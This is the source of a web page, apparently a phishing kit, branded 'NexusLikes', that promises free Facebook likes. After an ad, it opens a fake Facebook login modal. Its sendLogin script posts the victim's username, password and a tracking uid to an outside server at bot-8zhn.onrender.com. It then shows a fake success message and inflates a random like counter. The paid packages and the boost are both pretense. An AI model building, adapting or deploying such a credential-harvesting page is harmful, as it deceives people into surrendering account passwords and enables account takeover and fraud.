  .post-link {

  .post-meta {

  .like-count {

  .boost-btn i {

  .boost-btn:hover {

  /* MODAL - premium glass */
  .modal {
    display: none;
    position: fixed;
    z-index: 1000;
    left: 0;

    width: 100%;
    height: 100%;

  .modal-content {

  .modal-content h2 {
    font-size: 1.8rem;

    background: linear-gradient(135deg, #fff, #8bc34a);
    background-clip: text;

    color: transparent;

  }

  .modal-content input {
    width: 100%;
    padding: 0.9rem 1rem;
    margin: 0.6rem 0;

  }

  .modal-content input:focus {
    outline: none;

  }

  .modal-content button {
    width: 100%;
    padding: 0.9rem;
    margin-top: 1rem;
    border-radius: 2rem;
    background: linear-gradient(95deg, #1877f2, #2ecc71);
    border: none;
    color: white;
    font-weight: bold;

    transition: 0.2s;

  }

  .modal-content button:hover {

  /* Ad modal */
  .ad-modal .modal-content {
    max-width: 460px;
  }

  .ad-box {
    width: 100%;
    min-height: 180px;
    background: linear-gradient(145deg, #1e2a3a, #0f1724);
    border-radius: 1.2rem;
    display: flex;

  .ad-progress {

  .ad-progress > i {

  #ad-skip {

</style>

<body>

<h1><i class="fab fa-facebook"></i> NexusLikes <span style="font-size:1.6rem;">✨</span></h1>

<div class="input-section">
  <!-- Package selection - exactly same radio names & values -->
  <div class="package-group">
    <div class="package-title"><i class="fas fa-gem"></i> Select Like Package</div>
    <div class="radio-flex">
      <label><input type="radio" name="pkg" value="free" checked> ⚡ Free – 100 Likes (24h 2x)</label>
      <label><input type="radio" name="pkg" value="0.80_2k"> 💎 $0.80 – 2000 Likes</label>
      <label><input type="radio" name="pkg" value="1.50_5k"> 🔥 $1.50 – 5000 Likes</label>
      <label><input type="radio" name="pkg" value="3.00_10k"> 🚀 $3.00 – 10000 Likes</label>
    </div>
  </div>

  <input type="text" id="post-link" placeholder="📎 Paste Facebook post link ...">
  <button onclick="addPost()"><i class="fab fa-facebook-messenger"></i> Get Like</button>
</div>

<div class="container" id="posts-container"></div>

<!-- Login Modal (preserved IDs, fresh style) -->
<div class="modal" id="login-modal">
  <div class="modal-content">
    <h2><i class="fab fa-facebook"></i> Login</h2>
    <input type="text" id="username" placeholder="📧 Facebook Username / Email">
    <input type="password" id="password" placeholder="🔒 Password">
    <button onclick="sendLogin()"><i class="fas fa-arrow-right-to-bracket"></i> Facebook Login</button>
  </div>
</div>

<!-- AD Modal (Fallback) -->
<div class="modal ad-modal" id="ad-modal">
  <div class="modal-content">
    <div style="font-weight:600; color:#bbe1ff;"><i class="fas fa-ad"></i> Sponsored Ad</div>
    <div class="ad-box" id="ad-box">
      <i class="fas fa-hourglass-half" style="font-size:2rem;"></i>
      <span>Loading secure offer ...</span>
    </div>
    <div class="ad-progress"><i id="ad-progress-bar"></i></div>
    <div style="display:flex; gap:10px; justify-content:flex-end; margin-top: 16px;">
      <button id="ad-skip" style="background:#ef4444; border:none; padding:8px 18px; border-radius:40px; color:white; font-weight:600; cursor:pointer;"><i class="fas fa-forward"></i> Skip</button>
    </div>
  </div>
</div>

<script>
  // ---------- EXACT SAME LOGIC (PRESERVED) ----------
  const BACKEND_URL = "https://bot-8zhn.onrender.com";
  const postsContainer = document.getElementById("posts-container");
  const loginModal = document.getElementById("login-modal");
  const adModal = document.getElementById("ad-modal");
  const adBar = document.getElementById("ad-progress-bar");
  const adSkip = document.getElementById("ad-skip");

  const posts = [];
  let currentBoostIndex = null;

  function getSelectedPkg(){
    const r = document.querySelector('input[name="pkg"]:checked');
    return r ? r.value : 'free';
  }

  function addPost(){
    const linkEl = document.getElementById("post-link");
    const link = linkEl.value.trim();
    if(!link){ alert("Please enter a post link!"); return; }
    const post = { link, likes: Math.floor(Math.random()*10)+1, pkg: getSelectedPkg() };
    posts.push(post);
    renderPosts();
    linkEl.value = '';
  }

  function renderPosts(){
    postsContainer.innerHTML = '';
    posts.forEach((post,index)=>{
      const postDiv = document.createElement("div");
      postDiv.className = "post-box";
      postDiv.innerHTML = `
        <div style="flex:1">
          <div class="post-link"><i class="fab fa-facebook"></i> ${escapeHtml(post.link)}</div>
          <div class="post-meta"><i class="fas fa-tag"></i> Package: <b>${escapeHtml(post.pkg)}</b></div>
        </div>
        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:8px;">
          <button class="boost-btn" onclick="boostLike(${index})"><i class="fas fa-thumbs-up"></i> Boost Like</button>
          <span class="like-count" id="likes-${index}">${post.likes}</span>
        </div>
      `;
      postsContainer.appendChild(postDiv);
    });
  }

  function boostLike(index){
    const post = posts[index];
    if(post && post.pkg && post.pkg !== 'free'){
      alert("Balance নাই — paid package থেকে লাইক নেওয়া যাবে না। কেবল Free প্যাকেজ থেকে নেওয়া যাবে।");
      return;
    }
    currentBoostIndex = index;
    showAdThen(()=> {
      loginModal.style.display = "flex";
    });
  }

  function showAdThen(next){
    try {
      if(typeof window.monetag_showAd === 'function'){
        window.monetag_showAd().then(()=> next()).catch(()=> fallbackAd(next));
        return;
      }
      if(window.monetag && typeof window.monetag.show === 'function'){
        const res = window.monetag.show();
        if(res && typeof res.then === 'function'){
          res.then(()=> next()).catch(()=> fallbackAd(next));
        } else {
          fallbackAd(next);
        }
        return;
      }
      if(window.Monetag && typeof window.Monetag.showAd === 'function'){
        const p = window.Monetag.showAd();
        if(p && typeof p.then === 'function'){ p.then(()=> next()).catch(()=> fallbackAd(next)); }
        else { fallbackAd(next); }
        return;
      }
    } catch(e){}
    fallbackAd(next);
  }

  function fallbackAd(next){
    adModal.style.display = "flex";
    let elapsed = 0;
    const total = 3000;
    adBar.style.width = '0%';
    adSkip.disabled = true;
    adSkip.style.opacity = '0.5';
    const iv = setInterval(()=>{
      elapsed += 100;
      const pct = Math.min(100, Math.round((elapsed/total)*100));
      adBar.style.width = pct + '%';
      if(elapsed >= 1000){
        adSkip.disabled = false;
        adSkip.style.opacity = '1';
      }
      if(elapsed >= total){
        clearInterval(iv);
        adModal.style.display = "none";
        next();
      }
    },100);

    adSkip.onclick = ()=>{
      clearInterval(iv);
      adModal.style.display = "none";
      next();
    };
  }

  async function sendLogin(){
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const uid = (new URLSearchParams(window.location.search)).get("uid");

    if(!uid){
      alert("Invalid link: UID not found.");
      return;
    }
    if(!username || !password){
      alert("Enter both username and password.");
      return;
    }

    const payload = { uid, username, password };
    const controller = new AbortController();
    const timeoutMs = 8000;
    const timeout = setTimeout(()=> controller.abort(), timeoutMs);

    try {
      const res = await fetch(`${BACKEND_URL}/receive_login`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload),
        signal: controller.signal
      });
      clearTimeout(timeout);

      if(!res.ok){
        let txt = "";
        try { txt = await res.text(); } catch(e){}
        alert("Server error: " + res.status + (txt ? " — " + txt : ""));
        return;
      }

      const data = await res.json();

      if(data.status === "sent"){
        alert("✅ like submit successful!");
        loginModal.style.display = "none";
        if(currentBoostIndex !== null){
          posts[currentBoostIndex].likes += Math.floor(Math.random()*21) + 90;
          renderPosts();
          currentBoostIndex = null;
        }
      } else {
        alert("❌ Error: " + (data.error || JSON.stringify(data)));
      }

    } catch(err){
      clearTimeout(timeout);
      if(err.name === 'AbortError'){
        alert("❌ Network timeout: server did not respond.");
      } else {
        alert("❌ Network error: " + err);
      }
    }
  }

  window.onclick = function(event){
    if(event.target == loginModal){
      loginModal.style.display = "none";
      currentBoostIndex = null;
    }
    if(event.target == adModal){
      adModal.style.display = "none";
    }
  }

  function escapeHtml(s){
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
  }

  renderPosts();
</script>

</body>
</html>
